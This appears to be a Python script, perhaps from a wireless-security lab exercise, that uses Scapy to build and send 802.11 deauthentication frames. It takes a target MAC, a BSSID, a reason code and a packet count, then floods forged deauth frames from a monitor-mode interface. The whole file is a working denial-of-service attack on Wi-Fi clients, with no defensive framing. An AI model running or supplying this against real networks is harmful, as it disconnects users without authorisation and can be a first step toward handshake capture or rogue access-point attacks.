#!/usr/bin/env python
# coding: utf-8

import sys
from scapy.all import *

# Get infos
target = str(input("Target MAC: ")) 
#"f4:0f:24:3b:9f:ee"
ap = str(input("BSSID: ")) 
#"dc:a5:f4:60:c5:af"
reason = int(input("Reason (1, 4, 5 or 8): "))
nbPackets = int(input("#Packets: ")) 

# Construct the deauth packet (Type 0 / subtype 12) to send, setting the addresses accordingly to the reason
if reason == 1:
	# For the undefined reason, we choose to send 2 packets to optimize the chances of success.
    packets = [RadioTap() / Dot11(type=0, subtype=12, addr1=target, addr2=ap, addr3=ap) / Dot11Deauth(reason=reason), RadioTap() / Dot11(type=0, subtype=12, addr1=ap, addr2=target, addr3=ap) / Dot11Deauth(reason=int(reason))]
elif reason == 4 or reason == 5:
    packets = RadioTap() / Dot11(type=0, subtype=12, addr1=target, addr2=ap, addr3=ap) / Dot11Deauth(reason=reason)
elif reason == 8:
    packets = RadioTap() / Dot11(type=0, subtype=12, addr1=ap, addr2=target, addr3=ap) / Dot11Deauth(reason=reason)

# Sending the packets
for i in range(nbPackets):
    sendp(packets, iface="wlp3s0mon")
